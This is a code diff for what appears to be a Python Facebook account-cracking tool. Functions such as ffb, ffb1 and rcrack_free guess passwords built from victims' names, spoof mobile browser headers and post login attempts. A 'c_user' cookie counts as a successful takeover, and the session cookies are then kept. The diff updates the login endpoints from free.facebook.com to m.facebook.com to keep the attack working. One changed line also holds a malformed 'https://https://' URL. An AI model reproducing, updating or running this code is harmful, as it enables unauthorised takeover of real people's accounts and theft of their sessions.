@@ -260,7 +260,7 @@ def ffb(ids,names,passlist):
                         head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://free.facebook.com/home.php?refsrc=deprecated&ref=dbl&_rdr',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                         Shahin=session.cookies.get_dict().keys()
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
@@ -301,9 +301,9 @@ def ffb1(ids,names,passlist):
                         pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://free.facebook.com/home.php?refsrc=deprecated&ref=dbl&_rdr',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                         Shahin=session.cookies.get_dict().keys()
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
@@ -342,9 +342,9 @@ def ffb3(ids,names,passlist):
                         pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        getlog = session.get(f'https://https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://free.facebook.com/home.php?refsrc=deprecated&ref=dbl&_rdr',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                         Shahin=session.cookies.get_dict().keys()
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
@@ -386,7 +386,7 @@ def ffb4(ids,names,passlist):
                         head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://free.facebook.com/home.php?refsrc=deprecated&ref=dbl&_rdr',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                         Shahin=session.cookies.get_dict().keys()
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
@@ -574,7 +574,7 @@ def ffb7(ids,names,passlist):
                         head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://mobile.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://free.facebook.com/profile.php?eav=Afb9YVDAmNCB4q1oB8UYYmaZ2d4SvTmGgCQTz2uUE8DDOD_40KvLD1lVXnxRgLBMRk4&v=info&ref_component=mfreebasic_home_header&ref_page=/wap/home.php&refid=7&paipv=0',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                         Shahin=session.cookies.get_dict().keys()
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
@@ -699,7 +699,7 @@ def rcrack_free(idf,pwv):
 			"email":idf,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'free.facebook.com',
+			header_freefb = {'authority':'m.facebook.com',
 			'method': 'HOST',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -713,8 +713,8 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41'}
-			lo = session.post('https://free.facebook.com/home.php?refsrc=deprecated&ref=dbl&_rdr',data=log_data,headers=header_freefb).text
+			'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
+			lo = session.post('https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
